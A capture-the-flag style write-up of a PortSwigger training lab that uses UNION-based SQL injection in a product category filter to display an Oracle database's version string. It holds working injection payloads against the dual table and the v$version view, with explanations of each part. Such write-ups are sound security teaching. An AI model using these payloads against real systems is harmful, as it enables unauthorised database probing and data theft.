# Lab-3: [SQL injection attack, querying the database type and version on Oracle](https://portswigger.net/web-security/sql-injection/examining-the-database/lab-querying-database-version-oracle)
This lab contains a SQL injection vulnerability in the product category filter. You can use a UNION attack to retrieve the results from an injected query. 

**Aim :-** To solve the lab, display the database version string.

**Hint :-** On Oracle databases, every **SELECT** statement must specify a table to select **FROM**. If your **UNION SELECT** attack does not query from a table, you will still need to include the **FROM** keyword followed by a valid table name. 
There is a built-in table on Oracle called **dual** which you can use for this purpose. 
For example: ``` UNION SELECT 'abc' FROM dual ```


## Solution
- When select a category the query will look like the following
    ``` SELECT * FROM products WHERE category = 'Gifts' AND released = 1 ```

- To check **UNION** based SQLi is possible use the payload ``` ' UNION SELECT null,null FROM dual --``` which will make the query like the following
    ``` SELECT * FROM products WHERE category = 'Gifts' UNION SELECT null,null FROM dual --' AND released = 1 ```

- To display the version of the database use the payload ``` ' UNION SELECT null,banner FROM v$version -- ``` which will make the query like the following
    ``` SELECT * FROM products WHERE category = 'Gifts' UNION SELECT null,banner FROM v$version --' AND released = 1 ```

    **Explanation**
        - ``` null ``` Is used to match the number of columns returned by the original query.
        - ``` banner ``` Contains database version and platform details.
        - ``` v$version ``` A system view in Oracle databases that stores version information. 
